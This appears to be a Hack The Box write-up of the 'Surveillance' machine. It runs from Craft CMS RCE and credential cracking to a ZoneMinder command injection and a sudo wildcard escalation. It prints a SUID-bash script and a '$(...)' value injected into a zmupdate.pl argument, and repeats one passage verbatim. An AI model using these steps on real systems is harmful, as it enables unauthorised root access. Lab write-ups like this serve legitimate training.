---
slug: /write-up/htb/medium/surveillance
pagination_next: null
pagination_prev: null
---

## Enumeration


```bash
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title:  Surveillance 
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

ubuntu jammy running nginx 1.18.0

Browsing the web, we can see the following link: https://github.com/craftcms/cms/tree/4.4.14. Looks like it's made with `craftcms` and we have the precise version.

## Foothold

Looks like it's vulnerable to a RCE vulnerability (fixed by 4.4.15): 

- https://putyourlightson.com/articles/critical-craft-cms-security-vulnerability
- https://blog.calif.io/p/craftcms-rce
- https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226

With latest POC, we got foothoold, now we can run a reverse shell, improve it and start investigating.

Right now we can acess as `wwww-data`.

## Lateral movement

In home we found two users:

```bash
www-data@surveillance:~/html/craft/web/cpresources$ ls /home
matthew  zoneminder
```

There are many things listening in localhost:
```bash
www-data@surveillance:~/html/craft$ netstat -na |grep "LISTEN"
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN  
```

Looks like there's a `ZoneMinder` server running in port 8080 but only listening in localhost. Looks really interesting for later.

I managed to exfiltrate the contents of /var/www and found the configuration to connect to mysql database which contains an entry for admin user:

```bash
MariaDB [craftdb]> select username,fullName,password from users;
+----------+-----------+--------------------------------------------------------------+
| username | fullName  | password                                                     |
+----------+-----------+--------------------------------------------------------------+
| admin    | Matthew B | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe |
+----------+-----------+--------------------------------------------------------------+
```

If we manage to crack the hash, we might get the password of matthew user. Checking the contents, of the web there's a backup of the database which contains a different hash, it might be worth trying to crack it.

Crack it, got the user password for `matthew`: Looks like there's a `ZoneMinder` server running in port 8080 but only listening in localhost. Looks really interesting for later.

I managed to exfiltrate the contents of /var/www and found the configuration to connect to mysql database which contains an entry for admin user:

```bash
MariaDB [craftdb]> select username,fullName,password from users;
+----------+-----------+--------------------------------------------------------------+
| username | fullName  | password                                                     |
+----------+-----------+--------------------------------------------------------------+
| admin    | Matthew B | $2y$13$FoVGcLXXNe81B6x9bKry9OzGSSIYL7/ObcmQ0CXtgw.EpuNcx8tGe |
+----------+-----------+--------------------------------------------------------------+
```

If we manage to crack the hash, we might get the password of matthew user. Checking the contents, of the web there's a backup of the database which contains a different hash, it might be worth trying to crack it.

Crack it, got the user password for `matthew`. Now we can connect with SSH and read the user flag.

## Privilege escalation

The user cannot run sudo. Now that we have SSH access, we can do port forwarding to access the instance running in localhost:

```bash
ssh -L 8080:localhost:8080 matthew@surveillance.htb
```

We can have access to the ZoneMinder thing by using the user admin and the same password as `matthew`.

Now we can see the version: 
    v1.36.32

Looks like it's vulnerable to https://pentest-tools.com/vulnerabilities-exploits/zoneminder-snapshots-command-injection_22437 because it mentions prior versions to 1.36.33 and 1.37.33

Since the process does not appear for the user `matthew`, it might be running for another user or for `root`. Either way, we can try to exploit the RCE vulnerability and continue from there.

The POC worked perfectly and we got access to user `zoneminder`. Now let's improve the shell and continue.

Checking what the user can do, looks like it can execute some script as root without specifying a password:

```bash
zoneminder@surveillance:~$ sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
zoneminder@surveillance:~$ 
```

This means any user can run any binary called zm*.pl in the /usr/bin/ directory under the root context, no password will be prompted. Morevoer, any option can be passed to the binary since it uses a wildcard in the sudoers file. This is a wide open configuration which can be abused using wildcard injection. Prepare a shell exploit.

```bash
echo 'cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash' > /var/tmp/exploit.sh
chmod +x /var/tmp/exploit.sh
```

Now just run any zm* binary and inject a command calling the exploit, it will be executed under the root context. For example, using zmupdate with the --version option will force the tool to upgrade the database, and it allows us to inject a command to execute the exploit:

```bash
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/var/tmp/exploit.sh)'
```

Now execute the copied bash with `-p` and we got root access.